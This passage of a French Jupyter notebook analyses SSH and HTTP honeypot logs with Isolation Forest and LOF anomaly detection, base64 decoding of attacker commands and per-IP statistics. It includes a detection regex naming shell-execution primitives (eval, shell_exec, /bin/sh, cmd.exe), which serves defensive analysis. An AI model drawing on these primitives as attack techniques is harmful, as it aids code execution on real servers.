axes[1].bar(x, pca.explained_variance_ratio_, alpha=0.5, color='steelblue', edgecolor='black')
axes[1].plot(x, cumulative, 's-', color='red', linewidth=2, markersize=8, label='Cumulative')
axes[1].axhline(y=0.8, color='green', linestyle='--', alpha=0.5, label='80% threshold')
axes[1].axhline(y=0.95, color='orange', linestyle='--', alpha=0.5, label='95% threshold')
axes[1].set_xlabel('Composante principale', fontsize=12)
axes[1].set_ylabel('Variance expliquée cumulative', fontsize=12)
axes[1].set_title('Scree plot - Variance expliquée cumulative', fontsize=14, fontweight='bold')
axes[1].set_xticks(x)
axes[1].legend()
axes[1].grid(True, alpha=0.3)

plt.tight_layout()
show_plot(fig, "ACP - Scree plot (variance expliquée)")


** ACP - Scree plot (variance expliquée) **


In [22]:
# ═══════════════════════════════════════════════════════════════════════════════
# DÉTECTION D'ANOMALIES AVANCÉE — Features complémentaires
# ═══════════════════════════════════════════════════════════════════════════════
# Au-delà des volumes SSH/HTTP, on cherche des patterns COMPORTANCELS :
# 1. Diversité des utilisateurs tentés par IP
# 2. Diversité des mots de passe tentés
# 3. Diversité des commandes (mots uniques)
# 4. Taux d'événement (events/min entre 1er et dernier event)
# 5. Entropie horaire SSH (uniformité sur 24h)
# 6. Présence HTTP (binaire)
# 7. Nombre d'actions différentes (multi-action)

from sklearn.ensemble import IsolationForest
from sklearn.neighbors import LocalOutlierFactor
from sklearn.preprocessing import StandardScaler

print("[INFO] Préparation des features complémentaires...")

# Feature 1: Diversité des utilisateurs SSH tentés par IP
user_diversity = (
    dfssh
    .select("SourceIp", "User")
    .filter(pl.col("User").is_not_null() & (pl.col("User") != ""))
    .group_by("SourceIp")
    .agg(pl.col("User").n_unique().alias("user_diversity"))
)

# Feature 2: Diversité des mots de passe tentés par IP
pass_diversity = (
    dfssh
    .select("SourceIp", "Password")
    .filter(pl.col("Password").is_not_null() & (pl.col("Password") != ""))
    .group_by("SourceIp")
    .agg(pl.col("Password").n_unique().alias("pass_diversity"))
)

# Feature 3: Diversité des commandes (mots uniques)
cmd_diversity = (
    dfssh
    .select("SourceIp", "Command")
    .with_columns(pl.col("Command").str.split(" ").alias("words"))
    .explode("words")
    .select("SourceIp", "words")
    .group_by("SourceIp")
    .agg(pl.col("words").n_unique().alias("cmd_diversity"))
)

# Feature 4: Taux d'événement (events/minute)
event_rate = (
    dfssh
    .select("SourceIp", "DateTime")
    .group_by("SourceIp")
    .agg([
        pl.col("DateTime").min().alias("first_ts"),
        pl.col("DateTime").max().alias("last_ts"),
        pl.len().alias("event_count"),
    ])
    .with_columns(
        pl.col("first_ts").str.slice(11, 2).str.to_integer().alias("first_min"),
        pl.col("last_ts").str.slice(11, 2).str.to_integer().alias("last_min"),
    )
    .with_columns(
        (pl.col("last_min") - pl.col("first_min")).clip(lower_bound=1).alias("duration_min")
    )
    .with_columns(
        (pl.col("event_count") / pl.col("duration_min")).alias("event_rate")
    )
    .select("SourceIp", "event_rate")
)

# Feature 5: Entropie horaire SSH
ssh_by_ip_hour = (
    dfssh
    .with_columns(pl.col("DateTime").str.slice(11, 2).alias("hour"))
    .group_by("SourceIp", "hour")
    .agg(pl.len().alias("count"))
)

# Entropie horaire — approche pure Python (pas de map_elements/map_batches)
import math

# Extraire les données et calculer l'entropie avec Python
hour_data = ssh_by_ip_hour.select("SourceIp", "hour").to_dicts()
from collections import defaultdict
ip_hour_counts = defaultdict(lambda: defaultdict(int))
for row in hour_data:
    ip_hour_counts[row["SourceIp"]][row["hour"]] += 1

def calc_entropy(counts_dict):
    total = sum(counts_dict.values())
    if total == 0:
        return 0.0
    return float(-sum((c / total) * math.log(c / total) for c in counts_dict.values()))

entropy_rows = []
for ip, counts_dict in ip_hour_counts.items():
    entropy_rows.append({"SourceIp": ip, "ssh_hour_entropy": calc_entropy(counts_dict)})

entropy_by_ip = pl.DataFrame(entropy_rows).fill_null(0)

# Feature 6: Nombre d'actions différentes (multi-action)
multi_action = (
    dfssh
    .select("SourceIp", "Command")
    .group_by("SourceIp")
    .agg(pl.col("Command").n_unique().alias("multi_action"))
)

# Assembler toutes les features
anomaly_df = ssh_by_ip.join(http_by_ip, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(user_diversity, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(pass_diversity, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(cmd_diversity, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(event_rate, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(entropy_by_ip, on="SourceIp", how="left").fill_null(0)
anomaly_df = anomaly_df.join(multi_action, on="SourceIp", how="left").fill_null(0)

# Colonnes finales — 7 features comportementales
feature_cols = [
    "ssh_attempts", "user_diversity", "pass_diversity", "cmd_diversity",
    "event_rate", "ssh_hour_entropy", "multi_action",
]

# Ajouter la présence HTTP comme colonne séparée (pas dans les features d'anomalie)
anomaly_df = anomaly_df.with_columns(
    pl.when(pl.col("http_requests") > 0).then(1).otherwise(0).alias("http_present")
)

X_norm = StandardScaler().fit_transform(anomaly_df.select(feature_cols).to_numpy())

print(f"[INFO] {anomaly_df.height} IPs, {len(feature_cols)} features comportementales")
print(f"     Features: {', '.join(feature_cols)}")

# ═══════════════════════════════════════════════════════════════════════════════
# ISOLATION FOREST
# ═══════════════════════════════════════════════════════════════════════════════
print("\n[INFO] Entraînement Isolation Forest (contamination=0.05)...")
iso = IsolationForest(contamination=0.05, random_state=42, n_estimators=200)
iso.fit(X_norm)
iso_scores = iso.score_samples(X_norm)
iso_pred = iso.predict(X_norm)  # -1 = anomaly, 1 = normal

# ═══════════════════════════════════════════════════════════════════════════════
# LOCAL OUTLIER FACTOR (densité locale)
# ═══════════════════════════════════════════════════════════════════════════════
print("[INFO] Entraînement LOF (contamination=0.05)...")
lof = LocalOutlierFactor(n_neighbors=20, contamination=0.05, novelty=False)
lof_pred = lof.fit_predict(X_norm)  # -1 = anomaly, 1 = normal

# ═══════════════════════════════════════════════════════════════════════════════
# CROISER : IP détectée par AU MOINS UN des deux ?
# ═══════════════════════════════════════════════════════════════════════════════
anomaly_df = anomaly_df.with_columns([
    pl.Series("iso_score", iso_scores),
    pl.Series("iso_anomaly", iso_pred == -1),
    pl.Series("lof_anomaly", lof_pred == -1),
])

# Consensus : détecté par les DEUX méthodes
anomaly_df = anomaly_df.with_columns(
    (pl.col("iso_anomaly") & pl.col("lof_anomaly")).alias("consensus")
)

iso_count = int(anomaly_df.get_column("iso_anomaly").sum())
lof_count = int(anomaly_df.get_column("lof_anomaly").sum())
consensus_count = int(anomaly_df.get_column("consensus").sum())

print(f"\n{'='*60}")
print(f"  RÉSULTATS DÉTECTION D'ANOMALIES")
print(f"{'='*60}")
print(f"  Isolation Forest  : {iso_count} anomalies ({iso_count/anomaly_df.height*100:.1f}%)")
print(f"  Local Outlier Fact: {lof_count} anomalies ({lof_count/anomaly_df.height*100:.1f}%)")
print(f"  Consensus (les 2) : {consensus_count} IPs (fortement atypiques)")
print(f"{'='*60}")

# Top 15 des IPs les plus atypiques
print("\n=== Top 15 IPs les plus atypiques (Isolation Forest) ===")
top15 = anomaly_df.sort("iso_score").head(15)
for i, row in enumerate(top15.iter_rows(named=True), 1):
    markers = []
    if row["iso_anomaly"]: markers.append("ISO")
    if row["lof_anomaly"]: markers.append("LOF")
    flag = f" [{','.join(markers)}]" if markers else ""
    print(f"  {i:2d}. {row['SourceIp']:20s} Score={row['iso_score']:.4f}  "
          f"SSH={row['ssh_attempts']:5d}  "
          f"HTTP={row['http_present']}  "
          f"Users={row['user_diversity']:2d}  "
          f"Pass={row['pass_diversity']:2d}  "
          f"Cmd={row['cmd_diversity']:3d}  "
          f"Rate={row['event_rate']:.1f}  "
          f"Ent={row['ssh_hour_entropy']:.2f}  "
          f"Act={row['multi_action']}{flag}")

print("\n=== Top 15 IPs détectées SEULEMENT par LOF (pas par IF) ===")
lof_only = anomaly_df.filter(pl.col("lof_anomaly") & ~pl.col("iso_anomaly")).sort("iso_score").head(15)
if lof_only.height > 0:
    for i, row in enumerate(lof_only.iter_rows(named=True), 1):
        print(f"  {i:2d}. {row['SourceIp']:20s} SSH={row['ssh_attempts']:5d}  "
              f"HTTP={row['http_present']}  "
              f"Users={row['user_diversity']:2d}  "
              f"Pass={row['pass_diversity']:2d}  "
              f"Cmd={row['cmd_diversity']:3d}  "
              f"Rate={row['event_rate']:.1f}  "
              f"Ent={row['ssh_hour_entropy']:.2f}  "
              f"Act={row['multi_action']}")
else:
    print("  (aucune)")

# === Visualisations ===

# --- 1. Scatter plot coloré par score Isolation Forest ---
fig, ax = plt.subplots(figsize=(14, 8))
scatter = ax.scatter(
    anomaly_df.get_column("iso_score").to_list(),
    anomaly_df.get_column("event_rate").to_list(),
    c=anomaly_df.get_column("ssh_attempts").to_list(),
    cmap="hot", s=40, alpha=0.6, edgecolors="black", linewidths=0.3
)
ax.scatter(
    anomaly_df.filter(pl.col("consensus")).get_column("iso_score").to_list(),
    anomaly_df.filter(pl.col("consensus")).get_column("event_rate").to_list(),
    c="red", s=120, marker="X", label="Consensus (ISO+LOF)",
    edgecolors="darkred", linewidths=2, zorder=5
)
cbar = plt.colorbar(scatter, ax=ax)
cbar.set_label("Tentatives SSH", fontsize=10)
ax.set_xlabel("Score Isolation Forest (plus bas = plus anomalous)")
ax.set_ylabel("Taux d'événement (events/minute)")
ax.set_title("Détection d'anomalies — Features comportementales\n(rouge = consensus Isolation Forest + LOF)", fontsize=13, fontweight="bold")
ax.legend(loc="upper right")
ax.grid(True, alpha=0.3)
plt.tight_layout()
show_plot(fig, "Isolation Forest + LOF — Scatter plot (score vs event rate)")

# --- 2. Heatmap des corrélations entre features ---
fig, ax = plt.subplots(figsize=(10, 8))
corr_df = anomaly_df.select(feature_cols).to_numpy()
corr_matrix = np.corrcoef(corr_df, rowvar=False)
im = ax.imshow(corr_matrix, cmap="RdBu_r", vmin=-1, vmax=1, aspect="auto")
ax.set_xticks(range(len(feature_cols)))
ax.set_yticks(range(len(feature_cols)))
ax.set_xticklabels([c.replace("_", "\n") for c in feature_cols], rotation=45, fontsize=8, ha="right")
ax.set_yticklabels([c.replace("_", "\n") for c in feature_cols], fontsize=8)
for i in range(len(feature_cols)):
    for j in range(len(feature_cols)):
        ax.text(j, i, f"{corr_matrix[i,j]:.2f}", ha="center", va="center", fontsize=7,
                color="white" if abs(corr_matrix[i,j]) > 0.5 else "black")
plt.colorbar(im, ax=ax)
ax.set_title("Matrice de corrélation entre features comportementales", fontsize=13, fontweight="bold")
plt.tight_layout()
show_plot(fig, "Matrice de corrélation des features")

# --- 3. Comparaison des distributions : anomalies vs normal ---
fig, axes = plt.subplots(2, 2, figsize=(14, 10))
comp_features = ["user_diversity", "pass_diversity", "event_rate", "ssh_hour_entropy"]
for ax_sub, feat in zip(axes.flatten(), comp_features):
    norm_data = anomaly_df.filter(~pl.col("iso_anomaly")).get_column(feat).to_numpy()
    anom_data = anomaly_df.filter(pl.col("iso_anomaly")).get_column(feat).to_numpy()
    ax_sub.hist(norm_data, bins=40, alpha=0.6, color="steelblue", label="Normal", density=True)
    if len(anom_data) > 0:
        ax_sub.hist(anom_data, bins=20, alpha=0.8, color="red", label="Anomalie", density=True)
    ax_sub.set_title(f"Distribution : {feat}", fontsize=11, fontweight="bold")
    ax_sub.set_xlabel(feat)
    ax_sub.legend(fontsize=9)
    ax_sub.grid(True, alpha=0.3)
fig.suptitle("Distributions des features — Normal vs Anomalie (Isolation Forest)", fontsize=14, fontweight="bold")
plt.tight_layout()
show_plot(fig, "Distributions des features — Normal vs Anomalie")

# --- 4. Radar chart des top 10 anomalies ---
fig, ax_radar = plt.subplots(figsize=(12, 10), subplot_kw=dict(polar=True))
top10 = anomaly_df.sort("iso_score").head(10)
n_feat = len(feature_cols)
angles = np.linspace(0, 2 * np.pi, n_feat, endpoint=False).tolist()
angles += angles[:1]

for row in top10.iter_rows(named=True):
    vals = [row[f] for f in feature_cols]
    max_val = max(vals) if max(vals) > 0 else 1
    vals_norm = [(v / max_val) * 100 for v in vals]
    vals_norm += vals_norm[:1]
    ax_radar.plot(angles, vals_norm, linewidth=1.5, alpha=0.6)
    ax_radar.fill(angles, vals_norm, alpha=0.05)

ax_radar.set_xticks(angles[:-1])
ax_radar.set_xticklabels([f.replace("_", "\n") for f in feature_cols], fontsize=9)
ax_radar.set_title("Radar chart — Top 10 IPs les plus atypiques", fontsize=13, fontweight="bold")
ax_radar.legend(top10.get_column("SourceIp").to_list(), loc="upper right", bbox_to_anchor=(1.3, 1.1), fontsize=7)
plt.tight_layout()
show_plot(fig, "Radar chart des top 10 IPs atypiques")

print("\n[INFO] Visualisations terminées.")


[INFO] Préparation des features complémentaires...
[INFO] 659 IPs, 7 features comportementales
     Features: ssh_attempts, user_diversity, pass_diversity, cmd_diversity, event_rate, ssh_hour_entropy, multi_action

[INFO] Entraînement Isolation Forest (contamination=0.05)...


[INFO] Entraînement LOF (contamination=0.05)...

  RÉSULTATS DÉTECTION D'ANOMALIES
  Isolation Forest  : 33 anomalies (5.0%)
  Local Outlier Fact: 31 anomalies (4.7%)
  Consensus (les 2) : 0 IPs (fortement atypiques)

=== Top 15 IPs les plus atypiques (Isolation Forest) ===
   1. 91.92.42.10          Score=-0.8568  SSH= 2859  HTTP=0  Users=251  Pass=407  Cmd=178  Rate=1429.5  Ent=1.10  Act=84 [ISO]
   2. 176.65.139.250       Score=-0.8449  SSH= 2496  HTTP=0  Users=250  Pass=405  Cmd=132  Rate=1248.0  Ent=1.10  Act=38 [ISO]
   3. 113.87.80.122        Score=-0.7865  SSH= 1024  HTTP=0  Users= 1  Pass=512  Cmd=  4  Rate=1024.0  Ent=0.69  Act=2 [ISO]
   4. 51.83.143.139        Score=-0.7804  SSH= 8121  HTTP=0  Users= 1  Pass= 1  Cmd=  1  Rate=477.7  Ent=3.18  Act=1 [ISO]
   5. 113.87.80.22         Score=-0.7660  SSH=  738  HTTP=0  Users= 1  Pass=369  Cmd=  4  Rate=738.0  Ent=0.69  Act=2 [ISO]
   6. 192.140.2.100        Score=-0.7647  SSH=  317  HTTP=0  Users= 2  Pass= 3  Cmd=189  Rate=317.0

** Isolation Forest + LOF — Scatter plot (score vs event rate) **


/home/pouchou/.pyenv/versions/3.14.3/lib/python3.14/site-packages/sklearn/neighbors/_lof.py:325: UserWarning: Duplicate values are leading to incorrect results. Increase the number of neighbors for more accurate results.
  warnings.warn(


** Matrice de corrélation des features **


** Distributions des features — Normal vs Anomalie **
** Radar chart des top 10 IPs atypiques **

[INFO] Visualisations terminées.


In [23]:

# ═══════════════════════════════════════════════════════════════════
# Visualisations complémentaires — Isolation Forest + LOF
# Utilise anomaly_df créé par la cellule 31
# ═══════════════════════════════════════════════════════════════════
import matplotlib
matplotlib.use('Agg')
import base64
import tempfile
import numpy as np
import polars as pl
import matplotlib.pyplot as plt
from IPython.display import display, Image

# show_plot
def show_plot(fig, name=""):
    fig.savefig("plot.png", bbox_inches='tight')
    plt.close(fig)
    if name:
        print(f"** {name} **")

if 'anomaly_df' not in globals():
    print("ERREUR: anomaly_df non disponible")
    raise SystemExit(1)

print(f"Données disponibles : {anomaly_df.height} IPs")

# === Graphique 1 : Scatter plot ISO scores vs event_rate ===
fig, ax = plt.subplots(figsize=(14, 8))
normal = anomaly_df.filter(~pl.col('iso_anomaly'))
anom = anomaly_df.filter(pl.col('iso_anomaly'))

ax.scatter(
    normal.get_column('iso_score').to_list(),
    normal.get_column('event_rate').to_list(),
    c='steelblue', s=30, alpha=0.5, label='Normal'
)
ax.scatter(
    anom.get_column('iso_score').to_list(),
    anom.get_column('event_rate').to_list(),
    c='red', s=80, alpha=0.7, label='Anomalie (IF)'
)
# Top 10
top10 = anomaly_df.sort('iso_score').head(10)
for ip, iso_s, evt_r in zip(
    top10.get_column('SourceIp'),
    top10.get_column('iso_score'),
    top10.get_column('event_rate'),
):
    ax.annotate(ip[:14], (iso_s, evt_r), fontsize=7,
                color='darkred', fontweight='bold',
                xytext=(5, 5), textcoords='offset points')
ax.set_xlabel('Score Isolation Forest (plus bas = plus anomalie)')
ax.set_ylabel('Taux d\'événement (events/min)')
ax.set_title('Scatter plot — ISO scores vs Event Rate', fontsize=13, fontweight='bold')
ax.legend()
ax.grid(True, alpha=0.3)
show_plot(fig, "Scatter plot ISO vs Event Rate")

# === Graphique 2 : Boxplots des features ===
fig, axes = plt.subplots(2, 4, figsize=(20, 10))
feature_cols = ['ssh_attempts', 'user_diversity', 'pass_diversity', 'cmd_diversity',
                'event_rate', 'ssh_hour_entropy', 'multi_action']
titles = ['SSH attempts', 'User diversity', 'Password diversity', 'Command diversity',
          'Event rate', 'SSH hour entropy', 'Multi-action']

for i, (feat, title) in enumerate(zip(feature_cols, titles)):
    ax = axes.flatten()[i]
    norm_vals = anomaly_df.filter(~pl.col('iso_anomaly')).get_column(feat).to_list()
    anom_vals = anomaly_df.filter(pl.col('iso_anomaly')).get_column(feat).to_list()
    ax.boxplot([norm_vals, anom_vals])
    ax.set_title(title, fontweight='bold')
    ax.set_ylabel(feat.replace('_', ' '))

plt.suptitle('Features: Normal vs Anomalies', fontsize=16, fontweight='bold', y=1.02)
plt.tight_layout()
show_plot(fig, "Features Normal vs Anomalies")

# === Graphique 3 : Corrélation IF vs LOF ===
fig, ax = plt.subplots(figsize=(10, 8))
normal_mask = ~anomaly_df.get_column('iso_anomaly')
ax.scatter(
    anomaly_df.filter(normal_mask).get_column('iso_score').to_list(),
    anomaly_df.filter(normal_mask).get_column('lof_anomaly').cast(pl.Int32).to_list(),
    c='steelblue', s=30, alpha=0.4, label='Normal'
)
ax.scatter(
    anomaly_df.filter(pl.col('iso_anomaly')).get_column('iso_score').to_list(),
    anomaly_df.filter(pl.col('iso_anomaly')).get_column('lof_anomaly').cast(pl.Int32).to_list(),
    c='red', s=100, marker='X', label='Anomalie IF'
)
# Concordance
both = anomaly_df.filter(pl.col('iso_anomaly') & pl.col('lof_anomaly'))
ax.scatter(
    both.get_column('iso_score').to_list(),
    [1] * len(both),
    c='green', s=120, marker='*', label='Concordance IF+LOF'
)
ax.set_xlabel('Score Isolation Forest')
ax.set_ylabel('Anomalie LOF (1=oui)')
ax.set_title('Corrélation IF vs LOF', fontsize=14, fontweight='bold')
ax.legend()
ax.grid(True, alpha=0.3)
show_plot(fig, "Corrélation IF vs LOF")

# === Graphique 4 : Top 15 IPs anomalies (barres horizontales) ===
fig, ax = plt.subplots(figsize=(14, 8))
top15 = anomaly_df.sort('iso_score').head(15)
y_pos = range(len(top15))
ax.barh(y_pos, [-v for v in top15.get_column('iso_score').to_list()], color='steelblue', edgecolor='black')
ax.set_yticks(y_pos)
ax.set_yticklabels(top15.get_column('SourceIp').to_list())
ax.set_xlabel('-Score Isolation Forest (positif = plus anomalie)')
ax.set_title('Top 15 IPs les plus atypiques (Isolation Forest)', fontsize=13, fontweight='bold')
ax.invert_yaxis()
ax.grid(True, alpha=0.3, axis='x')
plt.tight_layout()
show_plot(fig, "Top 15 IPs atypiques")

print(f"\n=== Visualisations terminées ===")
print(f"  Total IPs: {anomaly_df.height}")
print(f"  Anomalies IF: {int(anomaly_df.get_column('iso_anomaly').sum())}")
print(f"  Anomalies LOF: {int(anomaly_df.get_column('lof_anomaly').sum())}")
print(f"  Concordance: {int((anomaly_df.get_column('iso_anomaly') & anomaly_df.get_column('lof_anomaly')).sum())}")


# === Graphique 4 : Radar chart des top 10 anomalies ===
fig2, ax_radar = plt.subplots(figsize=(14, 10), subplot_kw=dict(polar=True))
top10 = anomaly_df.sort("iso_score").head(10)
n_feat = len(feature_cols)
angles = np.linspace(0, 2 * np.pi, n_feat, endpoint=False).tolist()
angles += angles[:1]

for row in top10.iter_rows(named=True):
    vals = [row[f] for f in feature_cols]
    max_val = max(vals) if max(vals) > 0 else 1
    vals_norm = [(v / max_val) * 100 for v in vals]
    vals_norm += vals_norm[:1]
    ax_radar.plot(angles, vals_norm, linewidth=1.5, alpha=0.6)
    ax_radar.fill(angles, vals_norm, alpha=0.05)

ax_radar.set_xticks(angles[:-1])
ax_radar.set_xticklabels([f.replace("_", "\n") for f in feature_cols], fontsize=9)
ax_radar.set_title("Radar chart — Top 10 IPs les plus atypiques", fontsize=13, fontweight="bold")
ax_radar.legend(top10.get_column("SourceIp").to_list(), loc="upper right", bbox_to_anchor=(1.3, 1.1), fontsize=7)
plt.tight_layout()
show_plot(fig2, "Radar chart des top 10 IPs atypiques")

print("\n[INFO] Visualisations terminées.")


Données disponibles : 659 IPs


** Scatter plot ISO vs Event Rate **


** Features Normal vs Anomalies **
** Corrélation IF vs LOF **
** Top 15 IPs atypiques **

=== Visualisations terminées ===
  Total IPs: 659
  Anomalies IF: 33
  Anomalies LOF: 31
  Concordance: 0


** Radar chart des top 10 IPs atypiques **

[INFO] Visualisations terminées.


In [24]:
# ═══════════════════════════════════════════════════════════════════
# Boxplots des features — Adapté pour anomaly_df
# ═══════════════════════════════════════════════════════════════════

# Features à comparer (celles de anomaly_df)
comp_features = [
    "user_diversity",
    "pass_diversity", 
    "cmd_diversity",
    "event_rate",
    "ssh_hour_entropy",
    "multi_action"
]

titles = [
    "Diversité utilisateurs",
    "Diversité mots de passe",
    "Diversité commandes",
    "Taux d'événement",
    "Entropie horaire",
    "Multi-actions"
]

# Créer un subplot 2x3 pour les 6 features
fig, axes = plt.subplots(2, 3, figsize=(18, 10))
axes = axes.flatten()

for i, (feat, title) in enumerate(zip(comp_features, titles)):
    ax = axes[i]
    # Normal vs Anomalie ISO
    norm_data = anomaly_df.filter(~pl.col('iso_anomaly')).get_column(feat).to_list()
    anom_data = anomaly_df.filter(pl.col('iso_anomaly')).get_column(feat).to_list()
    
    ax.boxplot([norm_data, anom_data])
    ax.set_title(title, fontweight='bold')
    ax.set_ylabel(feat.replace('_', ' '))
    ax.set_xticklabels(['Normal', 'Anomalie'])

plt.suptitle('Distribution des features — Normal vs Anomalies (Isolation Forest)', fontsize=16, fontweight='bold', y=1.02)
plt.tight_layout()
show_plot(fig, "Boxplots des features — Normal vs Anomalie")

print("\n[INFO] Boxplots terminés.")


** Boxplots des features — Normal vs Anomalie **

[INFO] Boxplots terminés.


In [25]:
# Graphique 7: Anomalies DNS par type
if dns_anomalies:
    fig, axes = plt.subplots(1, 2, figsize=(14, 6))
    
    # Compter par type
    type_counts = {}
    for a in dns_anomalies:
        t = a["type"]
        type_counts[t] = type_counts.get(t, 0) + 1
    
    # Pie chart
    axes[0].pie(type_counts.values(), labels=type_counts.keys(), autopct='%1.1f%%', 
               startangle=90, colors=['#e74c3c', '#3498db', '#27ae60'])
    axes[0].set_title('Répartition des anomalies DNS', fontsize=14, fontweight='bold')
    
    # Bar chart
    axes[1].bar(type_counts.keys(), type_counts.values(), color=['#e74c3c', '#3498db', '#27ae60'],
               edgecolor='black')
    axes[1].set_title('Nombre d\'anomalies par type', fontsize=14, fontweight='bold')
    axes[1].set_ylabel('Nombre d\'anomalies')
    axes[1].set_xlabel('Type')
    
    for i, (k, v) in enumerate(type_counts.items()):
        axes[1].text(i, v + max(type_counts.values())*0.02, str(v), ha='center', fontweight='bold')
    
    plt.tight_layout()
    show_plot(fig)
else:
    pass


---

## 8. Payloads HTTP (body analysis)

In [26]:
# HTTP payloads detection
PAYLOAD_PATTERN = re.compile(
    r"php|eval|base64_decode|shell_exec|passthru|system\(|/bin/sh|/bin/bash|cmd\.exe"
)

def detect_http_payloads(df: pl.DataFrame) -> list[dict]:
    """Detect suspicious HTTP payloads in request bodies."""
    payloads = []
    df_filtered = df.filter(pl.col("Body").is_not_null()).select([
        "Body", "SourceIp", "RequestURI", "HTTPMethod", "DateTime"
    ])

    for row in df_filtered.iter_rows(named=True):
        body = str(row.get("Body") or "")
        if PAYLOAD_PATTERN.search(body):
            payloads.append({
                "type": "PAYLOAD DETECTED",
                "Method": row.get("HTTPMethod", ""),
                "RequestURI": row.get("RequestURI", ""),
                "SourceIp": row.get("SourceIp", ""),
            })

    return payloads

http_payloads = detect_http_payloads(dfhttp)
print(f"[INFO] {len(http_payloads)} payloads HTTP suspects détectés")

# Display payloads as DataFrame
if http_payloads:
    pl.DataFrame(http_payloads)
else:
    pass


[INFO] 34 payloads HTTP suspects détectés


---

## 9. Base64 decoding

In [27]:
# Base64 decoding
def decode_b64_commands(df: pl.DataFrame, output_path: Path) -> list[dict]:
    """Decode base64 strings from commands."""
    decoded_results = []

    df_words = df.with_columns(
        pl.col("Command").str.split(" ").alias("words")
    ).explode("words").rename({"words": "word"})

    word_counts = (
        df_words.get_column("word")
        .value_counts()
        .sort("count", descending=True)
    )

    for row in word_counts.iter_rows(named=True):
        cmd = (row.get("word") or "").strip().strip("'")
        if not cmd:
            continue

        mod = len(cmd) % 4
        padded = cmd
        if mod == 2:
            padded = cmd + "=="
        elif mod == 3:
            padded = cmd + "="

        try:
            decoded_bytes = base64.b64decode(padded)
            decoded_str = decoded_bytes.decode("iso-8859-1", errors="replace")
            decoded_str = re.sub(r"[^\x20-\x7E\n\t]", ".", decoded_str)
            if len(decoded_str) > 10:
                decoded_results.append({
                    "Command": cmd,
                    "count": row.get("count", 0),
                    "longueur": len(cmd),
                    "decoded": decoded_str,
                })
        except Exception:
            continue

    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w") as f:
        json.dump(decoded_results, f, indent=2, ensure_ascii=False)
    print(f"[INFO] Payloads décodés sauvegardés : {output_path}")

    return decoded_results

decoded = decode_b64_commands(dfssh, JSONDIR / "decoded.json")

# Display decoded commands as DataFrame
if decoded:
    pl.DataFrame(decoded).head(20)
else:
    pass


[INFO] Payloads décodés sauvegardés : json/decoded.json


---

## 10. HTTP-only attackers (probes sans SSH)

In [28]:
# HTTP-only attackers
ssh_ips = set(dfssh.get_column("SourceIp").str.strip_chars().unique().to_list())
http_ips = set(dfhttp.get_column("SourceIp").str.strip_chars().unique().to_list())
http_only_ips = http_ips - ssh_ips

print(f"[INFO] {len(http_only_ips)} IPs HTTP-only (pas d'SSH associé)")
print(f"[INFO] Total IPs SSH: {len(ssh_ips)}")
print(f"[INFO] Total IPs HTTP: {len(http_ips)}")

# Graphique 8: Répartition des IPs
fig, axes = plt.subplots(1, 2, figsize=(14, 5))

# Pie chart
labels = ['IPs SSH', 'IPs HTTP-only']
sizes = [len(ssh_ips), len(http_only_ips)]
colors = ['#3498db', '#e74c3c']
axes[0].pie(sizes, labels=labels, autopct='%1.1f%%', colors=colors, startangle=90)
axes[0].set_title('Répartition des IP sources', fontsize=14, fontweight='bold')

# Bar chart
axes[1].bar(labels, sizes, color=colors, edgecolor='black')
axes[1].set_title('Nombre d\'IPs par catégorie', fontsize=14, fontweight='bold')
axes[1].set_ylabel('Nombre d\'IPs')
for i, v in enumerate(sizes):
    axes[1].text(i, v + max(sizes)*0.02, str(v), ha='center', fontweight='bold')

plt.tight_layout()
show_plot(fig)

# Display HTTP-only IPs as DataFrame
if http_only_ips:
    pass


[INFO] 229 IPs HTTP-only (pas d'SSH associé)
[INFO] Total IPs SSH: 659
[INFO] Total IPs HTTP: 231


---

## 11. Timestamps premières attaques par IP

In [29]:
# First seen timestamps by IP
first_seen = (
    dfssh
    .select(["SourceIp", "DateTime"])
    .sort("DateTime")
    .group_by("SourceIp")
    .agg([
        pl.col("DateTime").min().alias("first_seen"),
    ])
)

print(f"[INFO] {first_seen.height} IP attaquantes avec date de première apparition")
first_seen.head(15)


[INFO] 659 IP attaquantes avec date de première apparition


SourceIp,first_seen
str,str
"""103.60.242.169""","""2026-06-29T10:38:40Z"""
"""103.193.74.79""","""2026-07-13T22:17:12Z"""
"""111.68.98.152""","""2026-07-09T09:28:59Z"""
"""58.229.141.26""","""2026-06-24T13:31:03Z"""
"""80.94.95.116""","""2026-05-30T00:35:53Z"""
…,…
"""117.132.5.139""","""2026-05-29T00:14:03Z"""
"""103.59.163.134""","""2026-07-12T08:02:17Z"""
"""43.112.65.10""","""2026-05-30T22:58:16Z"""


In [30]:
# Graphique 9: Top 15 premières apparitions par IP
if first_seen.height > 0:
    fig, ax = plt.subplots(figsize=(14, 8))
    
    top_first_seen = first_seen.head(15)
    
    ax.barh(range(len(top_first_seen)), top_first_seen.get_column("first_seen"), color='skyblue', edgecolor='black')
    ax.set_yticks(range(len(top_first_seen)))
    ax.set_yticklabels(top_first_seen.get_column("SourceIp").to_list(), fontsize=9)
    ax.set_xlabel('Date de première apparition')
    ax.set_title('Top 15 Premières Apparitions par IP', fontsize=14, fontweight='bold')
    ax.invert_yaxis()
    
    plt.tight_layout()
    show_plot(fig)
else:
    pass


---

## 12. Résumé complet de l'analyse

In [31]:
# Résumé final
print("\n" + "=" * 60)
print("  RÉSUMÉ FINAL — ANALYSE BEELZEBUB HONEYPOT")
print("=" * 60)
print(f"\n📊 Nombre total d'événements:")
print(f"   - SSH: {ssh_count} events")
print(f"   - HTTP: {http_count} events")
print(f"\n🎯 Attaquants identifiés:")
print(f"   - IPs totales (SSH): {len(ssh_ips)}")
print(f"   - IPs HTTP-only: {len(http_only_ips)}")
print(f"   - IP avec score d'intensité: {attack_scores.height}")
print(f"\n🔐 Mots de passe compromis:")
print(f"   - Total analysés: {password_analysis.height}")
if password_analysis.height > 0:
    print(f"   - Le plus utilisé: {password_analysis.head(1).get_column('Password')[0]} ({password_analysis.head(1).get_column('count')[0]} occurrences)")
print(f"\n📡 Commandes de téléchargement:")
print(f"   - wget/curl/ftp/tftp: {download_commands.height}")
print(f"   - URLs C2 distinctes: {urls.height}")
print(f"\n🔧 Persistence & Escalade:")
print(f"   - Cron: {cron_persistence.height}")
print(f"   - Modif. utilisateurs: {user_modification.height}")
print(f"   - Privilege escalation: {privilege_escalation.height}")
